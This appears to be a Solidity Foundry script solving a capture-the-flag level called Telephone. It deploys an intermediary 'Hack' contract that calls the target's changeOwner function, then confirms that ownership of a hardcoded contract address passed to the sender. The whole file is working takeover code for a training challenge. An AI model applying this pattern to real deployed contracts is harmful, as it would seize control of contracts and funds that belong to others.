// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface ITelephone {
  function changeOwner(address owner) external;

  function owner() external view returns (address);
}

contract Hack {
  ITelephone immutable target;

  constructor(address _target) {
    target = ITelephone(_target);
  }

  function hack() public {
    target.changeOwner(msg.sender);
  }
}

contract Solve is Script, Test {
  address target = 0x3F50262E96ed5d1E7987A4C90557291216A99Aba;

  function run() public {
    vm.startBroadcast();

    Hack h = new Hack(target);
    h.hack();
    require(ITelephone(target).owner() == msg.sender, "Incorrect owner");

    vm.stopBroadcast();
  }
}
